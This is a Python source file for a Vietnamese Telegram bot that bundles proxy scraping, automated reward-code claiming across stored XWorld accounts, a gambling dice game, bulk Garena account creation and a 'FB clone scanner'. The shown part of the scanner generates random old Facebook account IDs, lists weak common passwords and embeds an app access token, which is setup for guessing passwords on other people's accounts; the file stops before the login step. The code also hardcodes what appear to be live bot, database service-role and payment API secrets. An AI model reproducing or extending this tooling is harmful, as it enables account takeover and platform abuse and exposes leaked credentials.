#!/usr/bin/env python3
"""
Bot Tổng Hợp Full — IZE + FB Clone Scanner
Fixes: /menu hiển thị đầy đủ, xóa DDOS, xóa SpamSMS, xóa user proxy cmd,
       VietQR dùng vietqr.io, proxy tĩnh IPv4/IPv6, tích hợp FB scanner,
       output thẳng ra chat (không lưu file).
"""
import os, asyncio, tempfile, logging, threading, concurrent.futures
import time, re, json, random, string, secrets, uuid
from datetime import date, timedelta, datetime
from urllib.parse import urlparse, quote
from queue import Queue

import requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.error import BadRequest
from supabase import create_client, Client
from dotenv import load_dotenv
load_dotenv()

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== CONFIG ====================
BOT_TOKEN        = "8504373990:AAG4BAS3lYhukl03PDkveqTOcCr_a5SPcGA"
DATA_FILE        = "bot_user_data.json"
OWNER_USER_ID    = int(os.environ.get("OWNER_ID", "0"))
ADMIN_USERNAME   = "izedentiroty01"

SUPABASE_URL = "https://zbbgderbycdovdgwevke.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpiYmdkZXJieWNkb3ZkZ3dldmtlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc0ODIyMCwiZXhwIjoyMDk0MzI0MjIwfQ.6dhCEBnBx5oRf7oqsnwewBaT35jzUESy232hMfwaqXw"
supabase: Client = None

# ==================== SEPAY CONFIG ====================
SEPA_API_TOKEN       = "33UKQBQ0JLPZTRMODCGDYLFQBO6NA95ISYZVXDXEJL6WRC8QKHDTFWYSMPRVEW2L"
SEPAY_ACCOUNT_NUMBER = "05237890382763"
SEPAY_BIN            = "970422"
NAP_RATE             = 1  # 1 VND = 1 IZE

# ==================== STATIC PROXY (IPv4 & IPv6) ====================
# Thêm proxy trực tiếp vào đây — hỗ trợ http(IPv4), socks5(IPv4/IPv6)
# Ví dụ IPv4 : "http://1.2.3.4:8080"
# Ví dụ IPv6  : "socks5://[2001:db8::1]:1080"
# Để trống [] nếu không dùng proxy
STATIC_PROXIES = [
    # "http://YOUR_IPV4_PROXY:PORT",
    # "socks5://[YOUR_IPV6_PROXY]:PORT",
]
# Proxy dùng cho toàn bot (lấy proxy đầu tiên, None = không dùng)
_GLOBAL_PROXY = STATIC_PROXIES[0] if STATIC_PROXIES else None

def get_global_proxy_dict():
    if not _GLOBAL_PROXY:
        return None
    return {"http": _GLOBAL_PROXY, "https": _GLOBAL_PROXY}

# ==================== GLOBALS ====================
nap_requests   = {}
user_data_store = {}
user_runtime   = {}
chat_state     = {"active": False, "users": set(), "messages": {}, "anon_users": set()}
shop_items     = []
scan_lq_tasks  = {}
fb_scan_states = {}   # FB clone scanner state per chat

# ==================== SUPABASE ====================
def init_supabase():
    global supabase
    if SUPABASE_URL and SUPABASE_KEY:
        try: supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
        except Exception: supabase = None

# ==================== DATA ====================
def load_all_data():
    global supabase, user_data_store, shop_items
    defaults = {"blacklist": [], "owner": OWNER_USER_ID, "bot_enabled": True,
                "keys": {}, "top_reset_date": "2000-01-01", "shop_items": []}
    if supabase is None:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f: user_data_store = json.load(f)
        else: user_data_store = defaults.copy()
    else:
        user_data_store = defaults.copy()
        try:
            res = supabase.table("user_data").select("*").execute()
            for row in res.data:
                uid = row['user_id']; d = row.get('data', {})
                if uid == 0:
                    for k in ("blacklist","keys","top_reset_date","bot_enabled","owner","shop_items"):
                        user_data_store[k] = d.get(k, user_data_store.get(k))
                else: user_data_store[str(uid)] = d
        except Exception as e: logger.error(f"Load Supabase: {e}"); supabase = None
    for k, v in defaults.items():
        if k not in user_data_store: user_data_store[k] = v
    shop_items = user_data_store["shop_items"]

def _atomic_save(path, data):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f: json.dump(data, f, indent=2, ensure_ascii=False)
    os.replace(tmp, path)

def save_all_data():
    global supabase
    user_data_store["shop_items"] = shop_items
    if supabase is None:
        _atomic_save(DATA_FILE, user_data_store); return
    for uid_str, data in user_data_store.items():
        if uid_str in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
        try: supabase.table("user_data").upsert({"user_id": int(uid_str), "data": data,
                                                 "updated_at": datetime.utcnow().isoformat()}).execute()
        except Exception as e: logger.error(f"Save user {uid_str}: {e}")
    save_global_config()

def save_global_config():
    if supabase is None: return
    cfg = {k: user_data_store.get(k) for k in ("blacklist","keys","top_reset_date","bot_enabled","owner","shop_items")}
    try: supabase.table("user_data").upsert({"user_id": 0, "data": cfg,
                                              "updated_at": datetime.utcnow().isoformat()}).execute()
    except Exception as e: logger.error(f"Save global: {e}")

def is_bot_enabled(): return user_data_store.get("bot_enabled", True)

# ==================== ANTISPAM ====================
def check_antispam(uid):
    if is_owner(uid): return True, ""
    if is_blacklisted(uid): return False, "⛔ Bạn đã bị ban vĩnh viễn. Liên hệ admin để gỡ."
    a = get_user_antispam(uid); now = time.time()
    if a["ban_until"] > now: return False, "⚠️ Bạn đã bị cấm 4 giờ vì spam."
    ts = [t for t in a["timestamps"] if now - t < 4.0]
    a["timestamps"] = ts; ts.append(now)
    if len(ts) >= 3:
        a["ban_until"] = now + 4*3600; a["timestamps"] = []; save_all_data()
        return False, "⚠️ Bạn bị cấm 4 giờ vì spam quá nhiều."
    save_all_data(); return True, ""

# ==================== USER HELPERS ====================
def update_user_profile(user_id, update):
    uid = str(user_id)
    if uid not in user_data_store: user_data_store[uid] = {}
    u = update.effective_user
    user_data_store[uid]["profile"] = {"username": u.username, "first_name": u.first_name, "last_name": u.last_name}
    d = user_data_store[uid]
    if "game" not in d:
        d["game"] = {"balance":0,"ize_balance":0,"bet_amount":0,"bet_currency":"VND",
                     "received_welcome_bonus":False,"last_daily":None}
    if "activated_key" not in d: d["activated_key"] = None
    if "nap_code" not in d: d["nap_code"] = f"NAP{uid}"
    save_all_data()

def get_user_game_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "game" not in user_data_store[u]:
        user_data_store[u]["game"] = {"balance":0,"ize_balance":0,"bet_amount":0,
                                      "bet_currency":"VND","received_welcome_bonus":False,"last_daily":None}
    return user_data_store[u]["game"]

def get_user_xworld_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "xworld" not in user_data_store[u]:
        user_data_store[u]["xworld"] = {"accounts":[],"codes":[],"threshold":5,"claimed_history":{},"limit_reached":[]}
    return user_data_store[u]["xworld"]

def get_user_antispam(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "antispam" not in user_data_store[u]: user_data_store[u]["antispam"] = {"timestamps":[],"ban_until":0.0}
    return user_data_store[u]["antispam"]

def get_user_runtime(uid):
    if uid not in user_runtime:
        user_runtime[uid] = {"proxy_task":None,"proxy_msg":None,"proxy_stop_event":None,"monitor_task":None,"monitoring":False}
    return user_runtime[uid]

def is_blacklisted(uid): return str(uid) in user_data_store.get("blacklist", [])
def is_owner(uid): return uid == user_data_store.get("owner", 0) and uid != 0
def is_admin(uid):
    if is_owner(uid): return True
    return user_data_store.get(str(uid), {}).get("is_master", False)

def format_money(amount): return f"{amount:,} VND"
def format_ize(amount):   return f"{amount} IZE"
def parse_money(text):    return int(text.replace(",","").strip())

def grant_welcome_bonus(uid):
    g = get_user_game_data(uid)
    if not g["received_welcome_bonus"]:
        g["balance"] += 10_000_000; g["received_welcome_bonus"] = True; save_all_data(); return True
    return False

def grant_daily_bonus(uid):
    g = get_user_game_data(uid); today = date.today().isoformat()
    if g.get("last_daily") != today:
        g["balance"] += 500_000; g["last_daily"] = today; save_all_data(); return True
    return False

# ==================== KEY SYSTEM ====================
def generate_key():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))

def create_key(owner_id, duration_str=None, is_master=False):
    key = generate_key(); now = datetime.utcnow(); dur_sec = None
    if duration_str:
        m = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", duration_str.lower())
        if m:
            n, u = int(m.group(1)), m.group(2)
            dur_sec = n * {"s":1,"m":60,"h":3600,"d":86400,"w":604800,"month":2592000,"year":31536000}[u]
    user_data_store["keys"][key] = {
        "created_by":owner_id,"created_at":now.isoformat(),
        "duration_seconds":dur_sec,"expires_at":None,"assigned_to":None,"is_master":is_master
    }
    save_global_config(); save_all_data(); return key

def check_user_key(user_id):
    uid = str(user_id)
    key = user_data_store.get(uid, {}).get("activated_key")
    if not key: return False
    keys = user_data_store.get("keys", {})
    # Key không tồn tại trong kho -> xoa du lieu key cua user
    if key not in keys:
        user_data_store[uid]["activated_key"] = None
        user_data_store[uid].pop("is_master", None)
        save_all_data()
        return False
    ki = keys[key]
    if ki.get("assigned_to") != user_id: return False
    if ki.get("expires_at"):
        if datetime.utcnow() > datetime.fromisoformat(ki["expires_at"]):
            is_master = ki.get("is_master", False)
            del keys[key]
            user_data_store[uid]["activated_key"] = None
            if is_master:
                user_data_store[uid].pop("is_master", None)
            save_global_config()
            save_all_data()
            return False
    return True

async def request_key(update, context):
    await update.message.reply_text(
        f"🔑 Bạn chưa có key sử dụng bot.\nVui lòng nhập key (liên hệ @{ADMIN_USERNAME} để được cấp).\n🛒 /shop — Cửa hàng"
    )
    context.user_data["expect_key"] = True

async def process_key_input(update, context):
    uid = update.effective_user.id; key = update.message.text.strip()
    keys = user_data_store.get("keys", {})
    if key not in keys: await update.message.reply_text("❌ Key không hợp lệ."); return
    ki = keys[key]
    if ki.get("assigned_to") is not None and ki["assigned_to"] != uid:
        await update.message.reply_text("❌ Key đã được dùng bởi người khác."); return
    if ki.get("expires_at") and datetime.utcnow() > datetime.fromisoformat(ki["expires_at"]):
        await update.message.reply_text("❌ Key đã hết hạn."); return
    if ki.get("duration_seconds") is not None and not ki.get("expires_at"):
        ki["expires_at"] = (datetime.utcnow() + timedelta(seconds=ki["duration_seconds"])).isoformat()
    ki["assigned_to"] = uid; user_data_store[str(uid)]["activated_key"] = key
    context.user_data.pop("expect_key", None)
    if ki.get("is_master"):
        user_data_store[str(uid)]["is_master"] = True
        save_global_config(); save_all_data()
        await update.message.reply_text("👑 Key Master! Bạn có toàn quyền admin. Gõ /menu.")
    else:
        save_global_config(); save_all_data()
        await update.message.reply_text("✅ Key hợp lệ! Gõ /menu để bắt đầu.")

# ==================== PROXY CHECKER ====================
def get_proxy_dict_for_scan():
    """Dùng global proxy (IPv4/IPv6) cho các tác vụ scan."""
    return get_global_proxy_dict()

def fetch_proxies_from_url_http(url, table_id=None, table_class=None, proxies=None):
    proxies_list = []
    try:
        r = requests.get(url, headers={"User-Agent":"Mozilla/5.0"}, timeout=15, proxies=proxies); r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table", id=table_id) if table_id else (soup.find("table", class_=table_class) if table_class else soup.find("table"))
        if not table: return proxies_list
        for row in (table.find("tbody") or table).find_all("tr"):
            cols = row.find_all("td")
            if len(cols) >= 2:
                ip, port = cols[0].text.strip(), cols[1].text.strip()
                if ip and port: proxies_list.append(f"http://{ip}:{port}")
    except Exception as e: logger.error(f"Crawl {url}: {e}")
    return proxies_list

def fetch_proxies_from_raw_http(url, proxies=None):
    proxies_list = []
    try:
        resp = requests.get(url, timeout=15, proxies=proxies)
        if resp.status_code == 200:
            for item in re.split(r"\s+", resp.text.strip()):
                if not item or ":" not in item: continue
                if item.startswith(("https://","socks4://","socks5://")): continue
                proxies_list.append(item if item.startswith("http://") else f"http://{item}")
    except Exception: pass
    return proxies_list

def fetch_all_proxies_http(proxies=None):
    sources = [
        ("https://free-proxy-list.net/","proxylisttable",None),
        ("https://www.sslproxies.org/",None,"table"),
        ("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",None,None),
        ("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",None,None),
        ("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",None,None),
        ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",None,None),
    ]
    allp = []
    for url, tid, tcl in sources:
        if tid or tcl: allp.extend(fetch_proxies_from_url_http(url, tid, tcl, proxies))
        else: allp.extend(fetch_proxies_from_raw_http(url, proxies))
        time.sleep(0.3)
    seen = set(); unique = []
    for p in allp:
        if p not in seen: seen.add(p); unique.append(p)
    return unique

def check_proxy_http(proxy, test_url, timeout=15):
    try:
        s = time.time()
        r = requests.get(test_url, proxies={"http":proxy,"https":proxy}, timeout=timeout)
        if r.status_code == 200: return True, round(time.time()-s, 3), proxy
    except Exception: pass
    return False, None, proxy

def check_proxies_batch_http(proxies_list, test_url, timeout=15, max_workers=200, stop_event=None):
    if not proxies_list: return []
    live = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        fut = {ex.submit(check_proxy_http, p, test_url, timeout): p for p in proxies_list}
        for f in concurrent.futures.as_completed(fut):
            if stop_event and stop_event.is_set(): break
            try:
                ok, rt, _ = f.result()
                if ok: live.append((fut[f], rt))
            except Exception: pass
    return live

def check_proxies_from_file_http(path, test_url, timeout=15, max_workers=200, stop_event=None):
    try:
        with open(path, encoding="utf-8") as f: raw = [l.strip() for l in f if l.strip()]
    except Exception: return []
    clean = [f"http://{p}" if not p.startswith("http://") else p for p in raw]
    return check_proxies_batch_http(clean, test_url, timeout, max_workers, stop_event)

def multi_round_check_http(initial, test_url, rounds=3, interval_min=5, timeout=15, max_workers=200, stop_event=None):
    live = check_proxies_batch_http(initial, test_url, timeout, max_workers, stop_event)
    current = [p for p, _ in live]
    for r in range(2, rounds+1):
        if stop_event and stop_event.is_set(): return []
        for _ in range(interval_min*60):
            if stop_event and stop_event.is_set(): return []
            time.sleep(1)
        live = check_proxies_batch_http(current, test_url, timeout, max_workers, stop_event)
        current = [p for p, _ in live]
    return live

def format_proxy_list_short(lst):
    if not lst: return "Không có proxy live."
    lines = [f"✅ Tổng proxy live: {len(lst)}"]
    for i, (p, t) in enumerate(lst):
        if i >= 50: lines.append(f"...và {len(lst)-50} proxy khác."); break
        lines.append(f"{p}  ({t}s)")
    return "\n".join(lines)

# ==================== PROXY HANDLERS ====================
async def proxy_update_progress(uid, text, context, msg_obj):
    if msg_obj:
        try: await msg_obj.edit_text(text)
        except Exception: pass

async def run_proxy_check(update, context, long_mode=False):
    uid = update.effective_user.id; rt = get_user_runtime(uid)
    if rt.get("proxy_task") and not rt["proxy_task"].done():
        await update.callback_query.edit_message_text("⚠️ Scan proxy đang chạy."); return
    msg = await update.callback_query.message.reply_text("🔄 Đang khởi tạo...")
    rt["proxy_msg"] = msg; ev = threading.Event(); rt["proxy_stop_event"] = ev
    gp = get_proxy_dict_for_scan(); loop = asyncio.get_running_loop()
    def block():
        asyncio.run_coroutine_threadsafe(proxy_update_progress(uid,"🌐 Đang crawl proxy...",context,msg), loop)
        proxies = fetch_all_proxies_http(gp)
        if ev.is_set(): return None
        if not proxies:
            asyncio.run_coroutine_threadsafe(proxy_update_progress(uid,"❌ Không lấy được proxy.",context,msg), loop); return None
        asyncio.run_coroutine_threadsafe(proxy_update_progress(uid,f"📊 {len(proxies)} proxy. Đang check...",context,msg), loop)
        if long_mode: return multi_round_check_http(proxies,"http://ip-api.com/json/",3,5,15,200,ev)
        return check_proxies_batch_http(proxies,"http://ip-api.com/json/",15,200,ev)
    task = asyncio.create_task(loop.run_in_executor(None, block))
    rt["proxy_task"] = task
    try:
        live = await task
        if ev.is_set(): await msg.edit_text("⏹️ Đã hủy."); return
        if not live: await msg.edit_text("❌ Không có proxy live."); return
        # Output thẳng ra chat, không lưu file
        result_text = format_proxy_list_short(live)
        await msg.edit_text(result_text)
    except asyncio.CancelledError: await msg.edit_text("⏹️ Đã hủy.")
    except Exception as e: logger.error(f"Proxy error: {e}"); await msg.edit_text("❌ Lỗi.")
    finally: rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None

async def handle_proxy_file_upload(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    ok, msg = check_antispam(uid)
    if not ok: await update.message.reply_text(msg); return
    if not context.user_data.get("waiting_proxy_file"):
        await update.message.reply_text("Hãy dùng menu Proxy → Check từ file."); return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"): await update.message.reply_text("⚠️ Chỉ .txt"); return
    context.user_data["waiting_proxy_file"] = False
    await update.message.reply_text("⏳ Đang kiểm tra...")
    with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as _tmp:
        tmp_name = _tmp.name
    await (await doc.get_file()).download_to_drive(tmp_name)
    ev = threading.Event(); loop = asyncio.get_running_loop()
    try:
        live = await loop.run_in_executor(None, lambda: check_proxies_from_file_http(tmp_name,"http://ip-api.com/json/",15,200,ev))
    except Exception as e: await update.message.reply_text(f"❌ Lỗi: {e}"); return
    finally: os.unlink(tmp_name)
    # Output thẳng ra chat
    await update.message.reply_text(format_proxy_list_short(live) if live else "❌ Không có proxy live.")

# ==================== XWORLD ====================
def get_code_info(code, proxies=None):
    headers = {"accept":"*/*","content-type":"application/json","country-code":"vn",
               "origin":"https://xworld-app.com","referer":"https://xworld-app.com/","user-agent":"Mozilla/5.0","xb-language":"vi-VN"}
    try:
        r = requests.post("https://web3task.3games.io/v1/task/redcode/detail",headers=headers,
                          json={"code":code,"os_ver":"android","platform":"h5","appname":"app"},timeout=5,proxies=proxies).json()
        if r.get("code")==0 and r.get("message")=="ok":
            d = r["data"]; ad = d["data"]["admin"]
            return {"status":True,"total":d["user_cnt"],"used":d["progress"],"remaining":d["user_cnt"]-d["progress"],
                    "currency":d.get("currency","UNK"),"value":ad.get("ad_show_value",0),"name":ad.get("nick_name","Admin")}
    except Exception: pass
    return {"status":False,"message":"Lỗi"}

def nhap_code(userId, secretKey, code, proxies=None):
    headers = {"accept":"*/*","content-type":"application/json","origin":"https://xworld.info","referer":"https://xworld.info/",
               "user-agent":"Mozilla/5.0","user-id":userId,"user-secret-key":secretKey,"xb-language":"vi-VN"}
    try:
        r = requests.post("https://web3task.3games.io/v1/task/redcode/exchange",headers=headers,
                          json={"code":code,"os_ver":"android","platform":"h5","appname":"app"},timeout=5,proxies=proxies).json()
        if r.get("code")==0 and r.get("message")=="ok":
            return True, f"SUCCESS|{userId}|{r['data'].get('value',0)}|{r['data'].get('currency','')}"
        msg = r.get("message","").lower()
        if "limit" in msg: return False,"LIMIT_REACHED"
        if "reward has been received" in msg: return False,"CLAIMED"
        if "not exist" in msg or "finish" in msg: return False,"EXHAUSTED"
        return False, r.get("message","Unknown")
    except Exception as e: return False, str(e)

def parse_account_link(link):
    try:
        uid = link.split("?userId=")[1].split("&")[0]
        key = link.split("secretKey=")[1].split("&")[0]
        return uid, key
    except Exception: return None, None

async def xworld_monitor_loop(user_id, chat_id, context):
    rt = get_user_runtime(user_id)
    d = get_user_xworld_data(user_id)
    codes = d["codes"]
    accounts = d["accounts"]
    claimed = d["claimed_history"]
    limit = d["limit_reached"]
    rt["monitoring"] = True
    gp = get_proxy_dict_for_scan()
    await context.bot.send_message(chat_id, "🔍 Bắt đầu canh code XWorld...")
    try:
        while rt["monitoring"]:
            for item in list(codes):
                code = item["code"]
                info = get_code_info(code, gp)
                if not info["status"]:
                    continue
                remaining = info["remaining"]
                item["info"] = info
                save_all_data()
                if remaining <= 0:
                    if item in codes:
                        codes.remove(item)
                    await context.bot.send_message(chat_id, f"🏁 Code `{code}` đã hết.", parse_mode="Markdown")
                    save_all_data()
                    continue
                if 0 < remaining <= d["threshold"]:
                    await context.bot.send_message(
                        chat_id, f"⚡ Code `{code}` còn {remaining} slot. Đang nhận!", parse_mode="Markdown"
                    )
                    loop = asyncio.get_running_loop()
                    for acc in accounts:
                        uid_acc = acc["user_id"]
                        if uid_acc in limit or code in claimed.get(uid_acc, []):
                            continue
                        if not rt["monitoring"]:
                            break
                        success, res = await loop.run_in_executor(
                            None, nhap_code, uid_acc, acc["secret_key"], code, gp
                        )
                        if success:
                            parts = res.split("|")
                            val = parts[2] if len(parts) > 2 else "?"
                            cur = parts[3] if len(parts) > 3 else ""
                            await context.bot.send_message(
                                chat_id, f"✅ `{uid_acc}` nhận {val} {cur}", parse_mode="Markdown"
                            )
                            claimed.setdefault(uid_acc, []).append(code)
                        elif res == "LIMIT_REACHED":
                            if uid_acc not in limit:
                                limit.append(uid_acc)
                        elif res == "EXHAUSTED":
                            break
                    save_all_data()
            await asyncio.sleep(1.5)
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"XWorld monitor error: {e}")
    finally:
        rt["monitoring"] = False

async def start_xworld_monitor(update, context):
    uid = update.effective_user.id; d = get_user_xworld_data(uid); rt = get_user_runtime(uid)
    if rt.get("monitoring"): await update.callback_query.edit_message_text("⚠️ Đang canh rồi."); return
    if not d["accounts"]: await update.callback_query.answer("Chưa có tài khoản!", show_alert=True); return
    if not d["codes"]: await update.callback_query.answer("Chưa có code!", show_alert=True); return
    rt["monitor_task"] = asyncio.create_task(xworld_monitor_loop(uid, update.effective_chat.id, context))
    await update.callback_query.edit_message_text(f"✅ Bắt đầu canh! Ngưỡng: {d['threshold']}", reply_markup=xworld_menu_keyboard())

async def stop_xworld_monitor(update, context):
    rt = get_user_runtime(update.effective_user.id)
    if rt.get("monitoring"):
        rt["monitoring"] = False
        if rt.get("monitor_task"): rt["monitor_task"].cancel()
        await update.callback_query.edit_message_text("⏹️ Đã dừng.", reply_markup=xworld_menu_keyboard())
    else: await update.callback_query.answer("Không có phiên canh nào.")

# ==================== GAME TÀI XỈU ====================
def game_menu_keyboard(uid):
    g = get_user_game_data(uid); cur = g.get("bet_currency","VND")
    bet_str = format_money(g["bet_amount"]) if cur=="VND" else format_ize(g["bet_amount"])
    txt = (f"🎲 *Tài Xỉu*\n💰 VND: {format_money(g['balance'])}\n"
           f"💠 IZE: {format_ize(g['ize_balance'])}\n🎫 Cược: {bet_str} ({cur})")
    kb = [
        [InlineKeyboardButton("💵 Đặt cược", callback_data="game_setbet")],
        [InlineKeyboardButton("💱 Đổi tiền cược", callback_data="game_currency")],
        [InlineKeyboardButton("📈 Tài", callback_data="game_tai"), InlineKeyboardButton("📉 Xỉu", callback_data="game_xiu")]
    ]
    return InlineKeyboardMarkup(kb), txt

async def game_setbet_prompt(update, context):
    await update.callback_query.edit_message_text("Chọn cách cược:", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 Nhập số tiền", callback_data="game_input_bet")],
        [InlineKeyboardButton("🔥 All in", callback_data="game_allin")]
    ]))

async def game_currency_toggle(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    g["bet_currency"] = "IZE" if g.get("bet_currency","VND")=="VND" else "VND"; save_all_data()
    mk, tx = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(tx, parse_mode="Markdown", reply_markup=mk)

async def game_input_bet(update, context):
    context.user_data["expect_game_bet"] = True
    await update.callback_query.edit_message_text("Nhập số tiền cược (VD: 50,000 hoặc 50000):")

async def game_allin(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    cur = g.get("bet_currency","VND"); bal = g["balance"] if cur=="VND" else g["ize_balance"]
    if bal <= 0: await update.callback_query.edit_message_text("❌ Hết tiền."); return
    g["bet_amount"] = bal; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(f"✅ All in: {format_money(bal) if cur=='VND' else format_ize(bal)}", reply_markup=mk)

async def process_game_bet_amount(update, context):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    cur = g.get("bet_currency","VND")
    try: amount = int(update.message.text.strip()) if cur=="IZE" else parse_money(update.message.text.strip())
    except Exception: await update.message.reply_text("❌ Số không hợp lệ."); return
    if amount <= 0: await update.message.reply_text("❌ Phải >0."); return
    bal = g["balance"] if cur=="VND" else g["ize_balance"]
    if amount > bal: await update.message.reply_text(f"❌ Chỉ có {format_money(bal) if cur=='VND' else format_ize(bal)}"); return
    g["bet_amount"] = amount; save_all_data()
    context.user_data.pop("expect_game_bet", None)
    mk, _ = game_menu_keyboard(uid)
    await update.message.reply_text(f"✅ Đặt cược: {format_money(amount) if cur=='VND' else format_ize(amount)}", reply_markup=mk)

async def play_tai_xiu(update, context, choice):
    uid = update.effective_user.id; g = get_user_game_data(uid)
    if g["bet_amount"] <= 0: await update.callback_query.edit_message_text("❌ Chưa đặt cược."); return
    cur = g.get("bet_currency","VND"); bet = g["bet_amount"]
    dice = [random.randint(1,6), random.randint(1,6), random.randint(1,6)]
    total = sum(dice); is_tai = total >= 11
    win = (choice=="tai" and is_tai) or (choice=="xiu" and not is_tai)
    dice_str = f"🎲 {dice[0]}+{dice[1]}+{dice[2]} = {total} ({'Tài' if is_tai else 'Xỉu'})"
    if cur == "IZE":
        if win: g["ize_balance"] += bet; r = f"🎉 Thắng! {dice_str}\n+{format_ize(bet)}\nIZE: {format_ize(g['ize_balance'])}"
        else: g["ize_balance"] -= bet; r = f"😞 Thua! {dice_str}\n-{format_ize(bet)}\nIZE: {format_ize(g['ize_balance'])}"
    else:
        if win: g["balance"] += bet; r = f"🎉 Thắng! {dice_str}\n+{format_money(bet)}\nVND: {format_money(g['balance'])}"
        else: g["balance"] -= bet; r = f"😞 Thua! {dice_str}\n-{format_money(bet)}\nVND: {format_money(g['balance'])}"
    g["bet_amount"] = 0; save_all_data()
    mk, _ = game_menu_keyboard(uid)
    await update.callback_query.edit_message_text(r, reply_markup=mk)

# ==================== SCAN ACC LQ ====================
def create_garena_account(session):
    for attempt in range(3):
        try:
            r = session.get("https://keyherlyswar.x10.mx/Apidocs/reg/reglq.php", timeout=30)
            if r.status_code != 200:
                if attempt < 2: continue
                return False, None, None, f"HTTP {r.status_code}"
            data = r.json()
            if not data.get("status") or not data.get("result"):
                if attempt < 2: continue
                return False, None, None, "API không hợp lệ"
            info = data["result"][0]
            username = info.get("account") or info.get("username","")
            password = info.get("password","")
            if not username or not password:
                if attempt < 2: continue
                return False, None, None, "Thiếu user/pass"
            return True, username, password, "OK"
        except Exception: pass
    return False, None, None, "Max retries"

async def scan_lq_worker(chat_id, quantity, context):
    ev = threading.Event(); scan_lq_tasks[chat_id] = ev
    s = requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0"})
    gp = get_proxy_dict_for_scan()
    if gp: s.proxies.update(gp)
    created = 0
    for i in range(1, quantity+1):
        if ev.is_set(): break
        ok, user, pwd, msg = create_garena_account(s)
        # Output thẳng ra chat
        if ok: created += 1; await context.bot.send_message(chat_id, f"✅ #{i}: `{user}:{pwd}`", parse_mode="Markdown")
        else: await context.bot.send_message(chat_id, f"❌ #{i}: {msg}")
        await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, f"🏁 Hoàn tất: {created}/{quantity}")
    scan_lq_tasks.pop(chat_id, None)

async def scan_lq_infinite(chat_id, context):
    ev = threading.Event(); scan_lq_tasks[chat_id] = ev
    s = requests.Session(); s.headers.update({"User-Agent":"Mozilla/5.0"})
    gp = get_proxy_dict_for_scan()
    if gp: s.proxies.update(gp)
    cnt = 0; await context.bot.send_message(chat_id, "♾️ Scan liên tục. Dùng nút Dừng để dừng.")
    while not ev.is_set():
        ok, user, pwd, _ = create_garena_account(s)
        if ok: cnt += 1; await context.bot.send_message(chat_id, f"✅ #{cnt}: `{user}:{pwd}`", parse_mode="Markdown")
        else: await context.bot.send_message(chat_id, f"❌ Lần {cnt+1}")
        await asyncio.sleep(0.5)
    await context.bot.send_message(chat_id, "⏹️ Đã dừng scan.")
    scan_lq_tasks.pop(chat_id, None)

# ==================== FB CLONE SCANNER ====================
# ─── FB CLONE SCANNER ───────────────────────────────────────────

_FB_UA = ("Mozilla/5.0 (Linux; Android 9; SM-G960F) "
          "AppleWebKit/537.36 (KHTML, like Gecko) "
          "Chrome/74.0.3729.157 Mobile Safari/537.36")
_FB_ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
_FB_PASSWORDS    = ["123456", "1234567", "12345678", "123456789",
                    "123123", "1111111", "12345", "000000"]

def _fb_creation_year(uid: str) -> str:
    """Ước đoán năm tạo từ UID."""
    u = uid
    if u.startswith("100000"):   return "2009"
    if u.startswith("100001"):   return "2010"
    if u.startswith("10000200"): return "2010"
    if u.startswith("10000300"): return "2011"
    if u.startswith("10000400"): return "2011"
    if u.startswith("10000500"): return "2012"
    if u.startswith("10000600"): return "2012"
    if u.startswith("10000700"): return "2013"
    if u.startswith("10000800"): return "2013"
    if u.startswith("10000900"): return "2014"
    if u.startswith("1000100"):  return "2014"
    if u.startswith("1000200"):  return "2015"
    if u.startswith("1000300"):  return "2015"
    if u.startswith("1000400"):  return "2016"
    if u.startswith("1000500"):  return "2016"
    if u.startswith("100030"):   return "2011"
    if u.startswith("100040"):   return "2012"
    return "?"

def _fb_gen_uid(mode: str) -> str | None:
    """Sinh UID Facebook theo mode."""
    if mode == "A":
        # Clone 2010-2014: prefix 100001x -> 100009x (15 chữ số)
        prefix = random.choice(["100001","100002","100003","100004",
                                 "100005","100006","100007","100008","100009"])
        return prefix + "".join(random.choices("0123456789", k=9))
    if mode == "B":
        # Clone 100003/4 (2011-2012)
        prefix = random.choice(["100030","100031","100040","100041"])
        return prefix + "".join(random.choices("0123456789", k=9))
    if mode == "C":
        # Clone 2009: 100000x (15 chữ số)
        return "100000" + "".join(random.choices("0123456789", k=9))
    return None

